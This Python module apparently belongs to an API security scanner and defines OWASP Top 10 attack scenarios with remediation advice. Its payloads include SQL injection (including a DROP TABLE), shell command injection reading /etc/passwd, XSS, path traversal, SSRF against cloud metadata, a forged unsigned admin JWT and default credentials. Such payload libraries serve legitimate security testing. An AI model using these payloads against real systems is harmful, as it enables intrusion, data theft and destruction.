""""OWASP Top 10 (2021) pre-built attack scenarios."""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


@dataclass
class AttackScenario:
    id:          str
    name:        str
    owasp_id:    str         # e.g. "A01:2021"
    owasp_name:  str
    description: str
    severity:    str         # critical | high | medium | low
    payloads:    List[Dict[str, Any]] = field(default_factory=list)
    headers:     Dict[str, str] = field(default_factory=dict)
    notes:       str = ""
    remediation: str = ""
    cvss_base:   float = 0.0
    cve_refs:    List[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# A01:2021 – Broken Access Control
# ---------------------------------------------------------------------------

A01_BROKEN_ACCESS_CONTROL: List[AttackScenario] = [
    AttackScenario(
        id="A01-001", name="IDOR – Horizontal Privilege Escalation",
        owasp_id="A01:2021", owasp_name="Broken Access Control",
        description="Replace own resource ID with another user's ID to access their data.",
        severity="high", cvss_base=8.1,
        payloads=[{"user_id": 1}, {"user_id": 2}, {"account_id": 1}, {"id": "admin"}],
        remediation="Enforce object-level authorization on every endpoint. Verify ownership server-side.",
    ),
    AttackScenario(
        id="A01-002", name="Vertical Privilege Escalation – Role Tampering",
        owasp_id="A01:2021", owasp_name="Broken Access Control",
        description="Submit privileged role/permission fields in the request body.",
        severity="critical", cvss_base=9.8,
        payloads=[
            {"role": "admin"}, {"is_admin": True}, {"permissions": ["*"]},
            {"group": "administrators"}, {"access_level": 99},
        ],
        remediation="Never trust client-supplied role/permission fields. Assign roles server-side only.",
    ),
    AttackScenario(
        id="A01-003", name="Forced Browsing – Hidden Endpoint Access",
        owasp_id="A01:2021", owasp_name="Broken Access Control",
        description="Access admin/internal endpoints without appropriate credentials.",
        severity="high", cvss_base=7.5,
        payloads=[{}],
        headers={"X-Original-URL": "/admin/users", "X-Forwarded-For": "127.0.0.1"},
        remediation="Apply authentication and authorization checks on ALL endpoints including internal ones.",
    ),
    AttackScenario(
        id="A01-004", name="JWT Claim Tampering",
        owasp_id="A01:2021", owasp_name="Broken Access Control",
        description="Modify JWT payload to escalate privileges without invalidating the token.",
        severity="critical", cvss_base=9.0,
        payloads=[{}],
        headers={
            "Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.",
        },
        remediation="Validate JWT signatures using a fixed server-side algorithm. Reject 'alg: none' tokens.",
    ),
]

# ---------------------------------------------------------------------------
# A02:2021 – Cryptographic Failures
# ---------------------------------------------------------------------------

A02_CRYPTO_FAILURES: List[AttackScenario] = [
    AttackScenario(
        id="A02-001", name="Sensitive Data in URL Parameters",
        owasp_id="A02:2021", owasp_name="Cryptographic Failures",
        description="Detect if the API accepts or returns sensitive data (passwords, tokens) in URLs.",
        severity="medium", cvss_base=5.9,
        payloads=[{"password": "test123"}, {"token": "abc", "secret": "xyz"}],
        remediation="Never put sensitive data in URLs. Use POST body with HTTPS only.",
    ),
    AttackScenario(
        id="A02-002", name="Weak Password Policy Probe",
        owasp_id="A02:2021", owasp_name="Cryptographic Failures",
        description="Register accounts with trivially weak passwords to test enforcement.",
        severity="medium", cvss_base=5.0,
        payloads=[
            {"password": "password"}, {"password": "123456"}, {"password": "a"},
            {"password": ""}, {"password": "P@ss"},
        ],
        remediation="Enforce minimum password length (≥12), complexity, and check against breach databases.",
    ),
]

# ---------------------------------------------------------------------------
# A03:2021 – Injection
# ---------------------------------------------------------------------------

A03_INJECTION: List[AttackScenario] = [
    AttackScenario(
        id="A03-001", name="SQL Injection – Classic",
        owasp_id="A03:2021", owasp_name="Injection",
        description="Inject SQL metacharacters to manipulate backend queries.",
        severity="critical", cvss_base=9.8,
        payloads=[
            {"q": "' OR '1'='1"},
            {"q": "1; DROP TABLE users--"},
            {"q": "1 UNION SELECT username,password FROM users--"},
            {"search": "' OR 1=1--"},
            {"id": "1 OR SLEEP(5)"},
        ],
        remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
        cve_refs=["CVE-2021-27101"],
    ),
    AttackScenario(
        id="A03-002", name="NoSQL Injection – MongoDB Operator",
        owasp_id="A03:2021", owasp_name="Injection",
        description="Inject MongoDB comparison operators to bypass authentication or access all records.",
        severity="high", cvss_base=8.8,
        payloads=[
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": {"$ne": None}},
            {"$where": "1==1"},
        ],
        remediation="Validate and sanitize all inputs. Use schema validation (e.g. Mongoose strict mode).",
    ),
    AttackScenario(
        id="A03-003", name="Server-Side Template Injection (SSTI)",
        owasp_id="A03:2021", owasp_name="Injection",
        description="Inject template engine expressions to achieve RCE.",
        severity="critical", cvss_base=9.8,
        payloads=[
            {"name": "{{7*7}}"}, {"message": "${7*7}"}, {"template": "<%= 7*7 %>"},
            {"body": "#{7*7}"}, {"content": "@(7*7)"},
        ],
        remediation="Never render user-controlled data as a template. Use template sandboxing.",
    ),
    AttackScenario(
        id="A03-004", name="Command Injection",
        owasp_id="A03:2021", owasp_name="Injection",
        description="Inject OS command separators into parameters passed to shell execution.",
        severity="critical", cvss_base=9.8,
        payloads=[
            {"filename": "; cat /etc/passwd"},
            {"host":     "localhost; id"},
            {"path":     "| whoami"},
            {"cmd":      "`id`"},
        ],
        remediation="Never pass user input to shell commands. Use language-native APIs instead.",
    ),
    AttackScenario(
        id="A03-005", name="XSS – Stored/Reflected",
        owasp_id="A03:2021", owasp_name="Injection",
        description="Inject HTML/JavaScript that may be stored or reflected back to other users.",
        severity="high", cvss_base=7.4,
        payloads=[
            {"content": "<script>alert(document.domain)</script>"},
            {"bio":     "<img src=x onerror=alert(1)>"},
            {"comment": "javascript:alert(1)"},
            {"title":   "<svg onload=alert(1)>"},
        ],
        remediation="HTML-encode all output. Implement Content-Security-Policy headers.",
    ),
    AttackScenario(
        id="A03-006", name="Path Traversal",
        owasp_id="A03:2021", owasp_name="Injection",
        description="Use directory traversal sequences to read files outside the intended directory.",
        severity="high", cvss_base=7.5,
        payloads=[
            {"file":     "../../../../etc/passwd"},
            {"filename": "..%2F..%2F..%2Fetc%2Fpasswd"},
            {"path":     "....//....//etc/passwd"},
        ],
        remediation="Validate and canonicalize file paths. Restrict to a whitelist of allowed directories.",
    ),
]

# ---------------------------------------------------------------------------
# A04:2021 – Insecure Design
# ---------------------------------------------------------------------------

A04_INSECURE_DESIGN: List[AttackScenario] = [
    AttackScenario(
        id="A04-001", name="Business Logic – Negative Value",
        owasp_id="A04:2021", owasp_name="Insecure Design",
        description="Send negative quantities or amounts to exploit lack of boundary validation.",
        severity="high", cvss_base=7.5,
        payloads=[
            {"quantity": -1}, {"amount": -100}, {"count": -9999},
            {"price": -0.01}, {"qty": 0},
        ],
        remediation="Validate all numeric inputs server-side. Reject zero and negative values where nonsensical.",
    ),
    AttackScenario(
        id="A04-002", name="Business Logic – Double Coupon Apply",
        owasp_id="A04:2021", owasp_name="Insecure Design",
        description="Apply the same coupon code multiple times in rapid succession.",
        severity="high", cvss_base=7.0,
        payloads=[
            {"coupon_code": "SAVE50"}, {"coupon_code": "SAVE50"},
            {"promo": "HALFOFF"}, {"voucher": "FREE"},
        ],
        remediation="Track coupon usage server-side with idempotency. Mark used on first apply.",
    ),
    AttackScenario(
        id="A04-003", name="Workflow Bypass – Skip Payment",
        owasp_id="A04:2021", owasp_name="Insecure Design",
        description="Call order-completion endpoint directly without completing payment step.",
        severity="critical", cvss_base=9.0,
        payloads=[{"status": "paid"}, {"payment_status": "completed"}, {"paid": True}],
        remediation="Enforce state machine transitions server-side. Never rely on client-provided status.",
    ),
]

# ---------------------------------------------------------------------------
# A05:2021 – Security Misconfiguration
# ---------------------------------------------------------------------------

A05_SECURITY_MISCONFIGURATION: List[AttackScenario] = [
    AttackScenario(
        id="A05-001", name="HTTP Security Headers Missing",
        owasp_id="A05:2021", owasp_name="Security Misconfiguration",
        description="Check response for missing security headers.",
        severity="medium", cvss_base=5.0,
        payloads=[{}],
        notes="Check response headers: X-Frame-Options, X-Content-Type-Options, CSP, HSTS, Referrer-Policy",
        remediation="Configure web server to send all recommended security headers.",
    ),
    AttackScenario(
        id="A05-002", name="Stack Trace / Debug Info Leak",
        owasp_id="A05:2021", owasp_name="Security Misconfiguration",
        description="Trigger server errors to check if stack traces are returned to the client.",
        severity="medium", cvss_base=5.3,
        payloads=[
            {"id": "not-a-valid-uuid-!!!"},
            {"date": "this-is-not-a-date"},
            {},
        ],
        remediation="Disable debug mode in production. Return generic error messages to clients.",
    ),
    AttackScenario(
        id="A05-003", name="Default Credentials",
        owasp_id="A05:2021", owasp_name="Security Misconfiguration",
        description="Test common default credential combinations.",
        severity="critical", cvss_base=9.8,
        payloads=[
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "admin123"},
            {"email": "admin@example.com", "password": "admin"},
            {"username": "root",  "password": "root"},
        ],
        remediation="Change all default credentials before deployment. Force password change on first login.",
    ),
]

# ---------------------------------------------------------------------------
# A07:2021 – Identification and Authentication Failures
# ---------------------------------------------------------------------------

A07_AUTH_FAILURES: List[AttackScenario] = [
    AttackScenario(
        id="A07-001", name="Credential Stuffing",
        owasp_id="A07:2021", owasp_name="Identification and Authentication Failures",
        description="Attempt login with a list of commonly used credential pairs.",
        severity="high", cvss_base=7.5,
        payloads=[
            {"email": "user@test.com",  "password": "password123"},
            {"email": "admin@test.com", "password": "admin@123"},
            {"email": "test@test.com",  "password": "Test1234!"},
        ],
        remediation="Implement account lockout, CAPTCHA, and MFA. Monitor failed login attempts.",
    ),
    AttackScenario(
        id="A07-002", name="Brute Force – OTP / PIN",
        owasp_id="A07:2021", owasp_name="Identification and Authentication Failures",
        description="Systematically try all 4-digit OTPs to bypass 2FA.",
        severity="high", cvss_base=8.1,
        payloads=[{"otp": str(i).zfill(4)} for i in range(0, 100, 10)],
        remediation="Limit OTP attempts. Expire OTPs after a short window. Invalidate after failed attempts.",
    ),
    AttackScenario(
        id="A07-003", name="Password Reset Token Enumeration",
        owasp_id="A07:2021", owasp_name="Identification and Authentication Failures",
        description="Probe sequential/predictable password reset tokens.",
        severity="high", cvss_base=7.5,
        payloads=[
            {"token": "000001"}, {"token": "000002"}, {"token": "abc123"},
            {"reset_token": "1"}, {"reset_token": "admin"},
        ],
        remediation="Use cryptographically random tokens (≥128 bits). Expire after single use.",
    ),
]

# ---------------------------------------------------------------------------
# A08:2021 – Software and Data Integrity Failures
# ---------------------------------------------------------------------------

A08_INTEGRITY_FAILURES: List[AttackScenario] = [
    AttackScenario(
        id="A08-001", name="Mass Assignment",
        owasp_id="A08:2021", owasp_name="Software and Data Integrity Failures",
        description="Submit extra fields not in the official API spec to overwrite internal model properties.",
        severity="critical", cvss_base=9.1,
        payloads=[
            {"is_admin": True, "role": "admin", "verified": True, "email_verified": True},
            {"balance": 999999, "credits": 9999},
            {"subscription": "premium", "plan": "enterprise"},
            {"__v": 0, "_id": "507f1f77bcf86cd799439011"},
        ],
        remediation="Use an allowlist of permitted fields in every endpoint. Use DTOs with explicit mappings.",
    ),
    AttackScenario(
        id="A08-002", name="Prototype Pollution",
        owasp_id="A08:2021", owasp_name="Software and Data Integrity Failures",
        description="Inject __proto__ or constructor fields to pollute the JavaScript object prototype.",
        severity="high", cvss_base=7.5,
        payloads=[
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"__proto__[admin]": "true"},
        ],
        remediation="Use Object.create(null) for maps. Sanitize keys to reject '__proto__' and 'constructor'.",
    ),
]

# ---------------------------------------------------------------------------
# A09:2021 – Security Logging and Monitoring Failures
# ---------------------------------------------------------------------------

A09_LOGGING_FAILURES: List[AttackScenario] = [
    AttackScenario(
        id="A09-001", name="Log Injection",
        owasp_id="A09:2021", owasp_name="Security Logging and Monitoring Failures",
        description="Inject newline characters into logged fields to forge log entries.",
        severity="medium", cvss_base=5.3,
        payloads=[
            {"username": "admin\n2024-01-01 INFO: User admin logged in successfully"},
            {"email":    "test@test.com\r\n[ERROR] Auth bypass successful"},
        ],
        remediation="Sanitize all data before logging. Use structured logging (JSON) to prevent injection.",
    ),
]

# ---------------------------------------------------------------------------
# A10:2021 – Server-Side Request Forgery (SSRF)
# ---------------------------------------------------------------------------

A10_SSRF: List[AttackScenario] = [
    AttackScenario(
        id="A10-001", name="SSRF – Internal Network Scan",
        owasp_id="A10:2021", owasp_name="Server-Side Request Forgery",
        description="Supply internal URLs to make the server fetch internal resources.",
        severity="critical", cvss_base=9.3,
        payloads=[
            {"url": "http://169.254.169.254/latest/meta-data/"},  # AWS metadata
            {"url": "http://metadata.google.internal/"},           # GCP metadata
            {"url": "http://localhost:6379"},                      # Redis
            {"url": "http://10.0.0.1/admin"},                     # Internal network
            {"webhook": "http://169.254.169.254/latest/user-data"},
            {"callback": "file:///etc/passwd"},
        ],
        remediation="Validate and allowlist URLs server-side. Block RFC-1918 and link-local addresses.",
        cve_refs=["CVE-2021-21315"],
    ),
]

# ---------------------------------------------------------------------------
# Rate Limiting / DoS scenarios
# ---------------------------------------------------------------------------

RATE_LIMIT_SCENARIOS: List[AttackScenario] = [
    AttackScenario(
        id="RL-001", name="Rate Limit Bypass – Header Spoofing",
        owasp_id="A04:2021", owasp_name="Insecure Design",
        description="Spoof IP headers to bypass per-IP rate limiting.",
        severity="high", cvss_base=7.5,
        payloads=[{}],
        headers={
            "X-Forwarded-For": "1.2.3.4",
            "X-Real-IP": "1.2.3.4",
            "CF-Connecting-IP": "1.2.3.4",
            "True-Client-IP": "1.2.3.4",
        },
        remediation="Do not trust client-supplied IP headers for rate limiting. Use actual connection IP.",
    ),
    AttackScenario(
        id="RL-002", name="Slowloris / Slow POST",
        owasp_id="A04:2021", owasp_name="Insecure Design",
        description="Send a large payload body very slowly to tie up server connections.",
        severity="medium", cvss_base=5.9,
        payloads=[{"data": "A" * 100000}],
        remediation="Set server-side request timeout and max body size limits.",
    ),
]

# ---------------------------------------------------------------------------
# Aggregate: ALL scenarios
# ---------------------------------------------------------------------------

ALL_SCENARIOS: List[AttackScenario] = (
    A01_BROKEN_ACCESS_CONTROL +
    A02_CRYPTO_FAILURES +
    A03_INJECTION +
    A04_INSECURE_DESIGN +
    A05_SECURITY_MISCONFIGURATION +
    A07_AUTH_FAILURES +
    A08_INTEGRITY_FAILURES +
    A09_LOGGING_FAILURES +
    A10_SSRF +
    RATE_LIMIT_SCENARIOS
)

SCENARIOS_BY_OWASP: Dict[str, List[AttackScenario]] = {}
for _s in ALL_SCENARIOS:
    SCENARIOS_BY_OWASP.setdefault(_s.owasp_id, []).append(_s)


def get_scenarios(
    owasp_ids: Optional[List[str]] = None,
    severity:  Optional[List[str]] = None,
    profile:   str = "full",
) -> List[AttackScenario]:
    """
    Filter and return scenarios.

    profile: "quick"  — critical only
             "standard" — critical + high
             "full"    — all severities (default)
    """
    pool = ALL_SCENARIOS

    if profile == "quick":
        pool = [s for s in pool if s.severity == "critical"]
    elif profile == "standard":
        pool = [s for s in pool if s.severity in ("critical", "high")]

    if owasp_ids:
        pool = [s for s in pool if s.owasp_id in owasp_ids]
    if severity:
        pool = [s for s in pool if s.severity in severity]

    return pool


# missing import at module level
from typing import Dict, Optional  # noqa: E402
